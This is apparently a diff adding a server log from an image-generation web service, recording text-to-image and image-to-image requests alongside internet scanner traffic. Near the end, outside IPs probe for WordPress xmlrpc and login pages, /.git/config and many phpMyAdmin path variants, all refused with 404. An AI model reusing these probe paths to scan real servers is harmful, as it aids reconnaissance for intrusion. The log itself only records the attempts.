+Image2Image Processing is Done!
+INFO:     127.0.0.1:34260 - "POST /image2image HTTP/1.0" 200 OK
+INFO:     127.0.0.1:34262 - "GET /download?file_path=/root/magic_image/gen_images/nozrp4bykjrr_3D%E6%BC%AB%E7%94%BB.png HTTP/1.0" 200 OK
+INFO:     127.0.0.1:34264 - "POST /feedback HTTP/1.0" 200 OK
+  0%|          | 0/25 [00:00<?, ?it/s]  4%|▍         | 1/25 [00:04<01:53,  4.72s/it]  8%|▊         | 2/25 [00:05<00:48,  2.13s/it] 12%|█▏        | 3/25 [00:05<00:28,  1.30s/it] 16%|█▌        | 4/25 [00:05<00:19,  1.10it/s] 20%|██        | 5/25 [00:05<00:13,  1.44it/s] 24%|██▍       | 6/25 [00:06<00:10,  1.77it/s] 28%|██▊       | 7/25 [00:06<00:08,  2.08it/s] 32%|███▏      | 8/25 [00:06<00:07,  2.35it/s] 36%|███▌      | 9/25 [00:07<00:06,  2.56it/s] 40%|████      | 10/25 [00:07<00:05,  2.73it/s] 44%|████▍     | 11/25 [00:07<00:04,  2.86it/s] 48%|████▊     | 12/25 [00:08<00:04,  2.96it/s] 52%|█████▏    | 13/25 [00:08<00:03,  3.02it/s] 56%|█████▌    | 14/25 [00:08<00:03,  3.09it/s] 60%|██████    | 15/25 [00:09<00:03,  3.13it/s] 64%|██████▍   | 16/25 [00:09<00:02,  3.16it/s] 68%|██████▊   | 17/25 [00:09<00:02,  3.18it/s] 72%|███████▏  | 18/25 [00:10<00:02,  3.19it/s] 76%|███████▌  | 19/25 [00:10<00:01,  3.20it/s] 80%|████████  | 20/25 [00:10<00:01,  3.20it/s] 84%|████████▍ | 21/25 [00:10<00:01,  3.21it/s] 88%|████████▊ | 22/25 [00:11<00:00,  3.22it/s] 92%|█████████▏| 23/25 [00:11<00:00,  3.21it/s] 96%|█████████▌| 24/25 [00:11<00:00,  3.21it/s]100%|██████████| 25/25 [00:12<00:00,  3.22it/s]100%|██████████| 25/25 [00:12<00:00,  2.05it/s]
+File: ../gen_images/5mdqgauz68et_白日依山尽,,艺术创想.png is saved, done!
+Text2Image Processing is Done!
+INFO:     127.0.0.1:34266 - "POST /text2image HTTP/1.0" 200 OK
+INFO:     127.0.0.1:34268 - "GET /download?file_path=/root/magic_image/gen_images/5mdqgauz68et_%E7%99%BD%E6%97%A5%E4%BE%9D%E5%B1%B1%E5%B0%BD,,%E8%89%BA%E6%9C%AF%E5%88%9B%E6%83%B3.png HTTP/1.0" 200 OK
+INFO:     127.0.0.1:34270 - "POST /feedback HTTP/1.0" 200 OK
+2023-03-27 17:14:21.231499: I tensorflow/compiler/xla/stream_executor/cuda/cuda_gpu_executor.cc:981] successful NUMA node read from SysFS had negative value (-1), but there must be at least one NUMA node, so returning NUMA node zero
+2023-03-27 17:14:21.232952: W tensorflow/core/common_runtime/gpu/gpu_device.cc:1934] Cannot dlopen some GPU libraries. Please make sure the missing libraries mentioned above are installed properly if you would like to use GPU. Follow the guide at https://www.tensorflow.org/install/gpu for how to download and setup the required libraries for your platform.
+Skipping registering GPU devices...
+original image shape: (932, 640, 3)
+Do not need resize!
+File: ../gen_images/zr1uuir3w3ti_日漫.png is saved, done!
+Image2Image Processing is Done!
+INFO:     127.0.0.1:34272 - "POST /image2image HTTP/1.0" 200 OK
+INFO:     127.0.0.1:34274 - "GET /download?file_path=/root/magic_image/gen_images/zr1uuir3w3ti_%E6%97%A5%E6%BC%AB.png HTTP/1.0" 200 OK
+INFO:     127.0.0.1:34276 - "POST /feedback HTTP/1.0" 200 OK
+2023-03-27 17:15:10.187341: I tensorflow/compiler/xla/stream_executor/cuda/cuda_gpu_executor.cc:981] successful NUMA node read from SysFS had negative value (-1), but there must be at least one NUMA node, so returning NUMA node zero
+2023-03-27 17:15:10.188727: W tensorflow/core/common_runtime/gpu/gpu_device.cc:1934] Cannot dlopen some GPU libraries. Please make sure the missing libraries mentioned above are installed properly if you would like to use GPU. Follow the guide at https://www.tensorflow.org/install/gpu for how to download and setup the required libraries for your platform.
+Skipping registering GPU devices...
+original image shape: (854, 640, 3)
+Do not need resize!
+No face detected!
+File: ../gen_images/r0h7rhgrj15r_漫画.png is saved, done!
+Image2Image Processing is Done!
+INFO:     127.0.0.1:34278 - "POST /image2image HTTP/1.0" 200 OK
+INFO:     127.0.0.1:34280 - "GET /download?file_path=/root/magic_image/gen_images/r0h7rhgrj15r_%E6%BC%AB%E7%94%BB.png HTTP/1.0" 200 OK
+INFO:     127.0.0.1:34282 - "POST /feedback HTTP/1.0" 200 OK
+  0%|          | 0/25 [00:00<?, ?it/s]  4%|▍         | 1/25 [00:00<00:16,  1.49it/s]  8%|▊         | 2/25 [00:00<00:10,  2.19it/s] 12%|█▏        | 3/25 [00:01<00:08,  2.55it/s] 16%|█▌        | 4/25 [00:01<00:07,  2.78it/s] 20%|██        | 5/25 [00:01<00:06,  2.92it/s] 24%|██▍       | 6/25 [00:02<00:06,  3.01it/s] 28%|██▊       | 7/25 [00:02<00:05,  3.07it/s] 32%|███▏      | 8/25 [00:02<00:05,  3.12it/s] 36%|███▌      | 9/25 [00:03<00:05,  3.14it/s] 40%|████      | 10/25 [00:03<00:04,  3.16it/s] 44%|████▍     | 11/25 [00:03<00:04,  3.19it/s] 48%|████▊     | 12/25 [00:04<00:04,  3.20it/s] 52%|█████▏    | 13/25 [00:04<00:03,  3.20it/s] 56%|█████▌    | 14/25 [00:04<00:03,  3.21it/s] 60%|██████    | 15/25 [00:05<00:03,  3.21it/s] 64%|██████▍   | 16/25 [00:05<00:02,  3.20it/s] 68%|██████▊   | 17/25 [00:05<00:02,  3.20it/s] 72%|███████▏  | 18/25 [00:05<00:02,  3.21it/s] 76%|███████▌  | 19/25 [00:06<00:01,  3.21it/s] 80%|████████  | 20/25 [00:06<00:01,  3.21it/s] 84%|████████▍ | 21/25 [00:06<00:01,  3.21it/s] 88%|████████▊ | 22/25 [00:07<00:00,  3.21it/s] 92%|█████████▏| 23/25 [00:07<00:00,  3.21it/s] 96%|█████████▌| 24/25 [00:07<00:00,  3.22it/s]100%|██████████| 25/25 [00:08<00:00,  3.22it/s]100%|██████████| 25/25 [00:08<00:00,  3.07it/s]
+File: ../gen_images/253fb3pofobb_白日依山尽，黄河入海流,质感,赛博朋克.png is saved, done!
+Text2Image Processing is Done!
+INFO:     127.0.0.1:34284 - "POST /text2image HTTP/1.0" 200 OK
+INFO:     127.0.0.1:34286 - "GET /download?file_path=/root/magic_image/gen_images/253fb3pofobb_%E7%99%BD%E6%97%A5%E4%BE%9D%E5%B1%B1%E5%B0%BD%EF%BC%8C%E9%BB%84%E6%B2%B3%E5%85%A5%E6%B5%B7%E6%B5%81,%E8%B4%A8%E6%84%9F,%E8%B5%9B%E5%8D%9A%E6%9C%8B%E5%85%8B.png HTTP/1.0" 200 OK
+INFO:     127.0.0.1:34288 - "POST /feedback HTTP/1.0" 200 OK
+  0%|          | 0/25 [00:00<?, ?it/s]  4%|▍         | 1/25 [00:00<00:16,  1.42it/s]  8%|▊         | 2/25 [00:01<00:10,  2.12it/s] 12%|█▏        | 3/25 [00:01<00:08,  2.50it/s] 16%|█▌        | 4/25 [00:01<00:07,  2.74it/s] 20%|██        | 5/25 [00:01<00:06,  2.90it/s] 24%|██▍       | 6/25 [00:02<00:06,  2.99it/s] 28%|██▊       | 7/25 [00:02<00:05,  3.05it/s] 32%|███▏      | 8/25 [00:02<00:05,  3.11it/s] 36%|███▌      | 9/25 [00:03<00:05,  3.14it/s] 40%|████      | 10/25 [00:03<00:04,  3.15it/s] 44%|████▍     | 11/25 [00:03<00:04,  3.17it/s] 48%|████▊     | 12/25 [00:04<00:04,  3.19it/s] 52%|█████▏    | 13/25 [00:04<00:03,  3.19it/s] 56%|█████▌    | 14/25 [00:04<00:03,  3.19it/s] 60%|██████    | 15/25 [00:05<00:03,  3.18it/s] 64%|██████▍   | 16/25 [00:05<00:02,  3.19it/s] 68%|██████▊   | 17/25 [00:05<00:02,  3.20it/s] 72%|███████▏  | 18/25 [00:06<00:02,  3.20it/s] 76%|███████▌  | 19/25 [00:06<00:01,  3.21it/s] 80%|████████  | 20/25 [00:06<00:01,  3.20it/s] 84%|████████▍ | 21/25 [00:06<00:01,  3.21it/s] 88%|████████▊ | 22/25 [00:07<00:00,  3.21it/s] 92%|█████████▏| 23/25 [00:07<00:00,  3.20it/s] 96%|█████████▌| 24/25 [00:07<00:00,  3.20it/s]100%|██████████| 25/25 [00:08<00:00,  3.20it/s]100%|██████████| 25/25 [00:08<00:00,  3.05it/s]
+File: ../gen_images/ccm5o0fx1ea1_白日依山尽，黄河入海流,质感,中国画.png is saved, done!
+Text2Image Processing is Done!
+INFO:     127.0.0.1:34290 - "POST /text2image HTTP/1.0" 200 OK
+INFO:     127.0.0.1:34292 - "GET /download?file_path=/root/magic_image/gen_images/ccm5o0fx1ea1_%E7%99%BD%E6%97%A5%E4%BE%9D%E5%B1%B1%E5%B0%BD%EF%BC%8C%E9%BB%84%E6%B2%B3%E5%85%A5%E6%B5%B7%E6%B5%81,%E8%B4%A8%E6%84%9F,%E4%B8%AD%E5%9B%BD%E7%94%BB.png HTTP/1.0" 200 OK
+INFO:     127.0.0.1:34294 - "POST /feedback HTTP/1.0" 200 OK
+  0%|          | 0/25 [00:00<?, ?it/s]  4%|▍         | 1/25 [00:00<00:16,  1.49it/s]  8%|▊         | 2/25 [00:00<00:10,  2.18it/s] 12%|█▏        | 3/25 [00:01<00:08,  2.54it/s] 16%|█▌        | 4/25 [00:01<00:07,  2.76it/s] 20%|██        | 5/25 [00:01<00:06,  2.91it/s] 24%|██▍       | 6/25 [00:02<00:06,  3.00it/s] 28%|██▊       | 7/25 [00:02<00:05,  3.06it/s] 32%|███▏      | 8/25 [00:02<00:05,  3.11it/s] 36%|███▌      | 9/25 [00:03<00:05,  3.14it/s] 40%|████      | 10/25 [00:03<00:04,  3.16it/s] 44%|████▍     | 11/25 [00:03<00:04,  3.17it/s] 48%|████▊     | 12/25 [00:04<00:04,  3.18it/s] 52%|█████▏    | 13/25 [00:04<00:03,  3.18it/s] 56%|█████▌    | 14/25 [00:04<00:03,  3.18it/s] 60%|██████    | 15/25 [00:05<00:03,  3.19it/s] 64%|██████▍   | 16/25 [00:05<00:02,  3.19it/s] 68%|██████▊   | 17/25 [00:05<00:02,  3.20it/s] 72%|███████▏  | 18/25 [00:05<00:02,  3.20it/s] 76%|███████▌  | 19/25 [00:06<00:01,  3.20it/s] 80%|████████  | 20/25 [00:06<00:01,  3.20it/s] 84%|████████▍ | 21/25 [00:06<00:01,  3.19it/s] 88%|████████▊ | 22/25 [00:07<00:00,  3.20it/s] 92%|█████████▏| 23/25 [00:07<00:00,  3.19it/s] 96%|█████████▌| 24/25 [00:07<00:00,  3.19it/s]100%|██████████| 25/25 [00:08<00:00,  3.19it/s]100%|██████████| 25/25 [00:08<00:00,  3.06it/s]
+File: ../gen_images/bvcngf4nnvth_白日依山尽，黄河入海流,质感,梵高.png is saved, done!
+Text2Image Processing is Done!
+INFO:     127.0.0.1:34296 - "POST /text2image HTTP/1.0" 200 OK
+INFO:     127.0.0.1:34298 - "GET /download?file_path=/root/magic_image/gen_images/bvcngf4nnvth_%E7%99%BD%E6%97%A5%E4%BE%9D%E5%B1%B1%E5%B0%BD%EF%BC%8C%E9%BB%84%E6%B2%B3%E5%85%A5%E6%B5%B7%E6%B5%81,%E8%B4%A8%E6%84%9F,%E6%A2%B5%E9%AB%98.png HTTP/1.0" 200 OK
+INFO:     20.98.242.240:0 - "HEAD /xmlrpc.php HTTP/1.0" 404 Not Found
+INFO:     20.98.242.240:0 - "GET /wp-login.php HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:34304 - "POST /feedback HTTP/1.0" 200 OK
+INFO:     20.98.242.240:0 - "HEAD /wp/xmlrpc.php HTTP/1.0" 404 Not Found
+INFO:     20.98.242.240:0 - "HEAD /wordpress/xmlrpc.php HTTP/1.0" 404 Not Found
+INFO:     20.98.242.240:0 - "HEAD /old/xmlrpc.php HTTP/1.0" 404 Not Found
+INFO:     20.98.242.240:0 - "HEAD /new/xmlrpc.php HTTP/1.0" 404 Not Found
+INFO:     20.98.242.240:0 - "HEAD /blog/xmlrpc.php HTTP/1.0" 404 Not Found
+INFO:     20.98.242.240:0 - "HEAD /backup/xmlrpc.php HTTP/1.0" 404 Not Found
+INFO:     20.98.242.240:0 - "HEAD /web/xmlrpc.php HTTP/1.0" 404 Not Found
+INFO:     20.98.242.240:0 - "HEAD /site/xmlrpc.php HTTP/1.0" 404 Not Found
+2023-03-27 17:18:59.783746: I tensorflow/compiler/xla/stream_executor/cuda/cuda_gpu_executor.cc:981] successful NUMA node read from SysFS had negative value (-1), but there must be at least one NUMA node, so returning NUMA node zero
+2023-03-27 17:18:59.785212: W tensorflow/core/common_runtime/gpu/gpu_device.cc:1934] Cannot dlopen some GPU libraries. Please make sure the missing libraries mentioned above are installed properly if you would like to use GPU. Follow the guide at https://www.tensorflow.org/install/gpu for how to download and setup the required libraries for your platform.
+Skipping registering GPU devices...
+original image shape: (932, 640, 3)
+Do not need resize!
+File: ../gen_images/zcrc9n0hn52n_日漫.png is saved, done!
+Image2Image Processing is Done!
+INFO:     127.0.0.1:34322 - "POST /image2image HTTP/1.0" 200 OK
+INFO:     127.0.0.1:34324 - "GET /download?file_path=/root/magic_image/gen_images/zcrc9n0hn52n_%E6%97%A5%E6%BC%AB.png HTTP/1.0" 200 OK
+INFO:     127.0.0.1:34326 - "POST /feedback HTTP/1.0" 200 OK
+2023-03-27 17:19:25.796596: I tensorflow/compiler/xla/stream_executor/cuda/cuda_gpu_executor.cc:981] successful NUMA node read from SysFS had negative value (-1), but there must be at least one NUMA node, so returning NUMA node zero
+2023-03-27 17:19:25.797989: W tensorflow/core/common_runtime/gpu/gpu_device.cc:1934] Cannot dlopen some GPU libraries. Please make sure the missing libraries mentioned above are installed properly if you would like to use GPU. Follow the guide at https://www.tensorflow.org/install/gpu for how to download and setup the required libraries for your platform.
+Skipping registering GPU devices...
+original image shape: (854, 640, 3)
+Do not need resize!
+No face detected!
+File: ../gen_images/ly28zqwg1cyy_日漫.png is saved, done!
+Image2Image Processing is Done!
+INFO:     127.0.0.1:34328 - "POST /image2image HTTP/1.0" 200 OK
+INFO:     127.0.0.1:34330 - "GET /download?file_path=/root/magic_image/gen_images/ly28zqwg1cyy_%E6%97%A5%E6%BC%AB.png HTTP/1.0" 200 OK
+INFO:     127.0.0.1:34332 - "POST /feedback HTTP/1.0" 200 OK
+2023-03-27 17:19:51.555388: I tensorflow/compiler/xla/stream_executor/cuda/cuda_gpu_executor.cc:981] successful NUMA node read from SysFS had negative value (-1), but there must be at least one NUMA node, so returning NUMA node zero
+2023-03-27 17:19:51.556746: W tensorflow/core/common_runtime/gpu/gpu_device.cc:1934] Cannot dlopen some GPU libraries. Please make sure the missing libraries mentioned above are installed properly if you would like to use GPU. Follow the guide at https://www.tensorflow.org/install/gpu for how to download and setup the required libraries for your platform.
+Skipping registering GPU devices...
+original image shape: (854, 640, 3)
+Do not need resize!
+No face detected!
+File: ../gen_images/aa9vrpb13v9k_3D漫画.png is saved, done!
+Image2Image Processing is Done!
+INFO:     127.0.0.1:34334 - "POST /image2image HTTP/1.0" 200 OK
+INFO:     127.0.0.1:34336 - "GET /download?file_path=/root/magic_image/gen_images/aa9vrpb13v9k_3D%E6%BC%AB%E7%94%BB.png HTTP/1.0" 200 OK
+INFO:     127.0.0.1:34338 - "POST /feedback HTTP/1.0" 200 OK
+  0%|          | 0/25 [00:00<?, ?it/s]  4%|▍         | 1/25 [00:00<00:16,  1.45it/s]  8%|▊         | 2/25 [00:00<00:10,  2.15it/s] 12%|█▏        | 3/25 [00:01<00:08,  2.51it/s] 16%|█▌        | 4/25 [00:01<00:07,  2.75it/s] 20%|██        | 5/25 [00:01<00:06,  2.91it/s] 24%|██▍       | 6/25 [00:02<00:06,  3.00it/s] 28%|██▊       | 7/25 [00:02<00:05,  3.06it/s] 32%|███▏      | 8/25 [00:02<00:05,  3.11it/s] 36%|███▌      | 9/25 [00:03<00:05,  3.14it/s] 40%|████      | 10/25 [00:03<00:04,  3.15it/s] 44%|████▍     | 11/25 [00:03<00:04,  3.17it/s] 48%|████▊     | 12/25 [00:04<00:04,  3.18it/s] 52%|█████▏    | 13/25 [00:04<00:03,  3.18it/s] 56%|█████▌    | 14/25 [00:04<00:03,  3.20it/s] 60%|██████    | 15/25 [00:05<00:03,  3.20it/s] 64%|██████▍   | 16/25 [00:05<00:02,  3.21it/s] 68%|██████▊   | 17/25 [00:05<00:02,  3.21it/s] 72%|███████▏  | 18/25 [00:05<00:02,  3.21it/s] 76%|███████▌  | 19/25 [00:06<00:01,  3.21it/s] 80%|████████  | 20/25 [00:06<00:01,  3.22it/s] 84%|████████▍ | 21/25 [00:06<00:01,  3.22it/s] 88%|████████▊ | 22/25 [00:07<00:00,  3.23it/s] 92%|█████████▏| 23/25 [00:07<00:00,  3.21it/s] 96%|█████████▌| 24/25 [00:07<00:00,  3.21it/s]100%|██████████| 25/25 [00:08<00:00,  3.22it/s]100%|██████████| 25/25 [00:08<00:00,  3.06it/s]
+File: ../gen_images/rh4fljuezig2_白日依山尽，黄河入海流,质感,赛博朋克.png is saved, done!
+Text2Image Processing is Done!
+INFO:     127.0.0.1:34340 - "POST /text2image HTTP/1.0" 200 OK
+INFO:     127.0.0.1:34342 - "GET /download?file_path=/root/magic_image/gen_images/rh4fljuezig2_%E7%99%BD%E6%97%A5%E4%BE%9D%E5%B1%B1%E5%B0%BD%EF%BC%8C%E9%BB%84%E6%B2%B3%E5%85%A5%E6%B5%B7%E6%B5%81,%E8%B4%A8%E6%84%9F,%E8%B5%9B%E5%8D%9A%E6%9C%8B%E5%85%8B.png HTTP/1.0" 200 OK
+INFO:     127.0.0.1:34344 - "POST /feedback HTTP/1.0" 200 OK
+  0%|          | 0/25 [00:00<?, ?it/s]  4%|▍         | 1/25 [00:00<00:15,  1.51it/s]  8%|▊         | 2/25 [00:00<00:10,  2.20it/s] 12%|█▏        | 3/25 [00:01<00:08,  2.56it/s] 16%|█▌        | 4/25 [00:01<00:07,  2.79it/s] 20%|██        | 5/25 [00:01<00:06,  2.93it/s] 24%|██▍       | 6/25 [00:02<00:06,  3.01it/s] 28%|██▊       | 7/25 [00:02<00:05,  3.08it/s] 32%|███▏      | 8/25 [00:02<00:05,  3.13it/s] 36%|███▌      | 9/25 [00:03<00:05,  3.15it/s] 40%|████      | 10/25 [00:03<00:04,  3.16it/s] 44%|████▍     | 11/25 [00:03<00:04,  3.18it/s] 48%|████▊     | 12/25 [00:04<00:04,  3.18it/s] 52%|█████▏    | 13/25 [00:04<00:03,  3.20it/s] 56%|█████▌    | 14/25 [00:04<00:03,  3.20it/s] 60%|██████    | 15/25 [00:05<00:03,  3.20it/s] 64%|██████▍   | 16/25 [00:05<00:02,  3.21it/s] 68%|██████▊   | 17/25 [00:05<00:02,  3.20it/s] 72%|███████▏  | 18/25 [00:05<00:02,  3.21it/s] 76%|███████▌  | 19/25 [00:06<00:01,  3.21it/s] 80%|████████  | 20/25 [00:06<00:01,  3.20it/s] 84%|████████▍ | 21/25 [00:06<00:01,  3.20it/s] 88%|████████▊ | 22/25 [00:07<00:00,  3.19it/s] 92%|█████████▏| 23/25 [00:07<00:00,  3.20it/s] 96%|█████████▌| 24/25 [00:07<00:00,  3.20it/s]100%|██████████| 25/25 [00:08<00:00,  3.21it/s]100%|██████████| 25/25 [00:08<00:00,  3.07it/s]
+File: ../gen_images/lrhv2757rrl0_白日依山尽，黄河入海流,质感,梵高.png is saved, done!
+Text2Image Processing is Done!
+INFO:     127.0.0.1:34346 - "POST /text2image HTTP/1.0" 200 OK
+INFO:     127.0.0.1:34348 - "GET /download?file_path=/root/magic_image/gen_images/lrhv2757rrl0_%E7%99%BD%E6%97%A5%E4%BE%9D%E5%B1%B1%E5%B0%BD%EF%BC%8C%E9%BB%84%E6%B2%B3%E5%85%A5%E6%B5%B7%E6%B5%81,%E8%B4%A8%E6%84%9F,%E6%A2%B5%E9%AB%98.png HTTP/1.0" 200 OK
+INFO:     127.0.0.1:34350 - "POST /feedback HTTP/1.0" 200 OK
+INFO:     185.225.74.42:0 - "POST /boaform/admin/formLogin HTTP/1.0" 404 Not Found
+INFO:     64.62.197.45:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     64.62.197.37:0 - "GET /geoserver/web/ HTTP/1.0" 404 Not Found
+2023-03-27 17:43:38.767503: I tensorflow/compiler/xla/stream_executor/cuda/cuda_gpu_executor.cc:981] successful NUMA node read from SysFS had negative value (-1), but there must be at least one NUMA node, so returning NUMA node zero
+2023-03-27 17:43:38.768944: W tensorflow/core/common_runtime/gpu/gpu_device.cc:1934] Cannot dlopen some GPU libraries. Please make sure the missing libraries mentioned above are installed properly if you would like to use GPU. Follow the guide at https://www.tensorflow.org/install/gpu for how to download and setup the required libraries for your platform.
+Skipping registering GPU devices...
+original image shape: (851, 640, 3)
+Do not need resize!
+File: ../gen_images/kq7h2t18vgel_日漫.png is saved, done!
+Image2Image Processing is Done!
+INFO:     127.0.0.1:34358 - "POST /image2image HTTP/1.0" 200 OK
+INFO:     127.0.0.1:34360 - "GET /download?file_path=/root/magic_image/gen_images/kq7h2t18vgel_%E6%97%A5%E6%BC%AB.png HTTP/1.0" 200 OK
+INFO:     127.0.0.1:34362 - "POST /feedback HTTP/1.0" 200 OK
+2023-03-27 17:44:03.857637: I tensorflow/compiler/xla/stream_executor/cuda/cuda_gpu_executor.cc:981] successful NUMA node read from SysFS had negative value (-1), but there must be at least one NUMA node, so returning NUMA node zero
+2023-03-27 17:44:03.858994: W tensorflow/core/common_runtime/gpu/gpu_device.cc:1934] Cannot dlopen some GPU libraries. Please make sure the missing libraries mentioned above are installed properly if you would like to use GPU. Follow the guide at https://www.tensorflow.org/install/gpu for how to download and setup the required libraries for your platform.
+Skipping registering GPU devices...
+original image shape: (851, 640, 3)
+Do not need resize!
+File: ../gen_images/gxo6t351eral_漫画.png is saved, done!
+Image2Image Processing is Done!
+INFO:     127.0.0.1:34364 - "POST /image2image HTTP/1.0" 200 OK
+INFO:     127.0.0.1:34366 - "GET /download?file_path=/root/magic_image/gen_images/gxo6t351eral_%E6%BC%AB%E7%94%BB.png HTTP/1.0" 200 OK
+INFO:     127.0.0.1:34368 - "POST /feedback HTTP/1.0" 200 OK
+2023-03-27 17:44:33.222305: I tensorflow/compiler/xla/stream_executor/cuda/cuda_gpu_executor.cc:981] successful NUMA node read from SysFS had negative value (-1), but there must be at least one NUMA node, so returning NUMA node zero
+2023-03-27 17:44:33.223665: W tensorflow/core/common_runtime/gpu/gpu_device.cc:1934] Cannot dlopen some GPU libraries. Please make sure the missing libraries mentioned above are installed properly if you would like to use GPU. Follow the guide at https://www.tensorflow.org/install/gpu for how to download and setup the required libraries for your platform.
+Skipping registering GPU devices...
+original image shape: (851, 640, 3)
+Do not need resize!
+File: ../gen_images/pjj353js1ts2_3D漫画.png is saved, done!
+Image2Image Processing is Done!
+INFO:     127.0.0.1:34370 - "POST /image2image HTTP/1.0" 200 OK
+INFO:     127.0.0.1:34372 - "GET /download?file_path=/root/magic_image/gen_images/pjj353js1ts2_3D%E6%BC%AB%E7%94%BB.png HTTP/1.0" 200 OK
+INFO:     127.0.0.1:34374 - "POST /feedback HTTP/1.0" 200 OK
+INFO:     127.0.0.1:34376 - "GET / HTTP/1.0" 404 Not Found
+INFO:     146.190.154.101:0 - "GET /aaa9 HTTP/1.0" 404 Not Found
+INFO:     146.190.154.101:0 - "GET /aab8 HTTP/1.0" 404 Not Found
+INFO:     146.190.154.101:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:34384 - "GET /actuator/health HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:34386 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:34388 - "GET /favicon.ico HTTP/1.0" 404 Not Found
+INFO:     176.53.218.58:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     176.53.217.11:0 - "GET /favicon.ico HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:34394 - "GET / HTTP/1.0" 404 Not Found
+INFO:     66.249.68.5:0 - "GET /robots.txt HTTP/1.0" 404 Not Found
+INFO:     66.249.79.62:0 - "GET /robots.txt HTTP/1.0" 404 Not Found
+INFO:     66.249.68.9:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     66.249.79.34:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     193.32.162.159:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     66.249.79.57:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     179.43.177.242:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     127.0.0.1:34414 - "GET /.git/config HTTP/1.0" 404 Not Found
+INFO:     92.118.39.108:0 - "GET /.git/config HTTP/1.0" 404 Not Found
+WARNING:  Invalid HTTP request received.
+INFO:     66.249.68.5:0 - "GET / HTTP/1.0" 404 Not Found
+INFO:     103.76.148.30:0 - "GET /mysql/web/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.76.148.30:0 - "GET /phpmyadmin2017/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.76.148.30:0 - "GET /phpmyadmin_/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.76.148.30:0 - "GET /PMA/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.76.148.30:0 - "GET /phpMyAdmin3/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.76.148.30:0 - "GET /db/db-admin/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.76.148.30:0 - "GET /phpmyadmin2/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.76.148.30:0 - "GET /_phpMyAdmin/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.76.148.30:0 - "GET /phpMyAdmin5/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.76.148.30:0 - "GET /__phpmyadmin/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.76.148.30:0 - "GET /phpmyadmin2020/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.76.148.30:0 - "GET /db/phpmyadmin/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.76.148.30:0 - "GET /sql/sqlweb/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.76.148.30:0 - "GET /db/websql/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.76.148.30:0 - "GET /phpMyAdmin-4.9.10-all-languages/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.76.148.30:0 - "GET /_phpMyAdmin/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.76.148.30:0 - "GET /sql/phpmanager/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.76.148.30:0 - "GET /phpMyAdmin-5.3.0-all-languages/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.76.148.30:0 - "GET /admin/web/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.76.148.30:0 - "GET /sql/phpmanager/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.76.148.30:0 - "GET /phpMyAdmin-4.9.7/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.76.148.30:0 - "GET /phpmy/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.76.148.30:0 - "GET /administrator/phpmyadmin/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.76.148.30:0 - "GET /phpmy/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.76.148.30:0 - "GET /phpMyAdmin-latest-all-languages/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.76.148.30:0 - "GET /phpmyadmin2015/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.76.148.30:0 - "GET /admin/phpMyAdmin/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.76.148.30:0 - "GET /mysql/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.76.148.30:0 - "GET /phpmyadmin2017/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.76.148.30:0 - "GET /admin/sysadmin/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.76.148.30:0 - "GET /phpMyAdmin-4.9.7/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.76.148.30:0 - "GET /db/myadmin/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.76.148.30:0 - "GET /db/phpMyAdmin-5/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.76.148.30:0 - "GET /index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.76.148.30:0 - "GET /phpMyAdmin-5.1.0/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.76.148.30:0 - "GET /MyAdmin/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.76.148.30:0 - "GET /mysql/admin/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.76.148.30:0 - "GET /mysql/web/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.76.148.30:0 - "GET /db/dbweb/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.76.148.30:0 - "GET /sql/sqlweb/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.76.148.30:0 - "GET /pma/index.php?lang=en HTTP/1.0" 404 Not Found
+INFO:     103.76.148.30:0 - "GET /sql/sqladmin/index.php?lang=en HTTP/1.0" 404 Not Found
